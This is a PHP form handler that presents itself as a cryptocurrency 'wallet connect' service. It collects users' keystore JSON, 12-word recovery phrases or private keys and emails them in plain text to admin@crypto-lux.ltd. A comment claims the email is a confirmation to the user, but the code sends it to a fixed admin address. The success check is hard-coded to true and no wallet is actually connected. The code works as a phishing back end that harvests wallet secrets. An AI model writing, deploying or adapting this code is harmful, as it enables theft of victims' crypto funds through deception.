<?php
// Include any necessary files or configurations here

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Handle form submission

    // Get form data
    $phrType = $_POST['phr_type'];
    $walletType = $_POST['wallet_type'];
    $username = $_POST['username'];

    // Get data based on the active tab
    switch ($phrType) {
        case 'Keystore JSON':
            $keystr = $_POST['keystr'];
            $wallet = $_POST['wallet1'];
            break;

        case '12-word Phrase':
            $mne = $_POST['mne'];
            $wallet = $_POST['wallet2'];
            break;

        case 'Private Key':
            $pkey = $_POST['pkey'];
            $wallet = $_POST['wallet3'];
            break;

        default:
            // Handle other cases if needed
            break;
    }

    // Validate and process the data
    // Add your validation logic and database operations here

    // For demonstration purposes, let's assume the validation is successful
    $success = true;

    if ($success) {
        // Insert data into the database or perform any other necessary actions

        // Send confirmation email to the user
        $to = 'admin@crypto-lux.ltd';
        $subject = 'New Wallet Connect';
        $message = "Username: $username\nWallet Type: $walletType\nPHR Type: $phrType\nWallet Address: $wallet\n\nAdditional Data:\n";
        
        // Include additional data based on the active tab
        switch ($phrType) {
            case 'Keystore JSON':
                $message .= "Keystore JSON: $keystr";
                break;

            case '12-word Phrase':
                $message .= "Mnemonics: $mne";
                break;

            case 'Private Key':
                $message .= "Private Key: $pkey";
                break;

            default:
                // Handle other cases if needed
                break;
        }

        // Use wordwrap() if lines are longer than 70 characters
        $message = wordwrap($message, 70);

        // Send email
        mail($to, $subject, $message);

        // Send a response back to the JavaScript code
        echo 1;
    } else {
        // Handle validation errors
        echo 0;
    }
} else {
    // Redirect or handle non-POST requests accordingly
    header('Location: account');
    exit();
}
?>
